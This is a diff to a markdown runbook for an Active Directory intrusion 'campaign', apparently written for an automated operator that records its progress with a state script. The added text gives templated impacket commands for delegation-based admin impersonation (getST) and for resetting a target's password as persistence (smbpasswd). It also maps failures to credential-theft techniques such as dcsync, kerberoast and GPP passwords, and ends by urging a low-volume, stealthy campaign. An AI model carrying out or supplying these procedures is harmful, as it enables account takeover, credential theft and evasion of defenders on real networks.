+python -m impacket.examples.getST -spn cifs/<target-fqdn> -impersonate <admin> -dc-ip <domain.dc_ip> <domain.name>/<campaign.machine_account.name>:<campaign.machine_account.password>
+```
+
+Outputs:
+
+```
+python scripts/state.py add domain.rbcd '{"delegate_from": "<campaign.machine_account.name>", "delegate_to": "<target-machine-account>"}'
+python scripts/state.py add tickets.service '{"spn": "cifs/<target-fqdn>", "principal": "<admin>", "impersonated_user": "<admin>", "ccache_file": "<admin>.ccache"}'
+```
+
+Rollback: if the RBCD edge is revoked, `mark-stale` `domain.rbcd[n]` and re-run this technique.
+
+## 5.5 Reset Account Password
+
+- Technique id: `persistence.reset-password`
+- ATT&CK: T1098 (Account Manipulation)
+
+Purpose: reset a target account's password with admin rights.
+
+Inputs: an admin account with `password` from `users`, the target user, and the new password (a task-text intent, like the spray candidate).
+
+Procedure (one atomic action):
+
+```
+python -m impacket.examples.smbpasswd -newpass <new> -reset <domain.name>/<admin>:<password>@<target-ip>
+```
+
+Outputs:
+
+```
+python scripts/state.py merge users[<index>] '{"password": "<new>", "stale": false}'
+```
+
+Rollback: if the reset is later reverted, `mark-stale` the user object and re-run.
 
 ---
 
@@ -977,15 +1346,23 @@ Rollback is triggered whenever a command fails because a state object's field is
    python scripts/state.py unset-stale <path>
    ```
 
+> **Scalar vs object fields.** `mark-stale`/`unset-stale`/`touch` operate on *object* fields (dicts, e.g. `users[n]`, `hosts[n]`, `domain.spns[n]`) because a `stale` flag can only live on a dict. Scalar fields (e.g. `domain.dc_ip`, `domain.name`, `domain.domain_sid`) cannot carry a flag — when they go stale, simply re-run the producing technique and overwrite them with `set` (Step 2 + `set`, skipping `mark-stale`/`unset-stale`).
+
 Common stale cases:
 
 | Symptom | Stale object | Re-collect with |
 |---------|--------------|-----------------|
 | Hash/password rejected | `users[n]` | `credential.dump-secrets` / `credential.dcsync` |
-| DC unreachable / wrong IP | `domain.dc_ip` | `discovery.orientation` |
+| DC unreachable / wrong IP | `domain.dc_ip` (scalar → `set`) | `discovery.orientation` |
 | Kerberos ticket rejected | `tickets.tgt[n]` etc. | the ticket's producing technique |
 | SPN no longer resolves | `domain.spns[n]` | `credential.kerberoast` |
 | Delegation relationship changed | `domain.delegation[n]` | `lateral.delegation-enum` |
 | Port/service changed on a host | `hosts[n]` | `discovery.port-scan` |
+| FQDN/machine account no longer resolves | `hosts[n].fqdn` / `hosts[n].machine_account` | `discovery.host-identify` |
+| Share list changed / share gone | `hosts[n].shares` | `discovery.share-enum` |
+| Group membership changed | `users[n].groups` / `domain.groups[n]` | `discovery.group-enum` |
+| GPP credential rejected | `users[n]` | `credential.gpp-password` |
+| RBCD edge revoked | `domain.rbcd[n]` | `persistence.rbcd` |
+| Machine account no longer valid | `users[n]` (machine account) | `persistence.add-computer` |
 
 Do not retry the same failing command more than once; diagnose staleness and re-collect instead. Keep the whole campaign low-volume and stealthy.
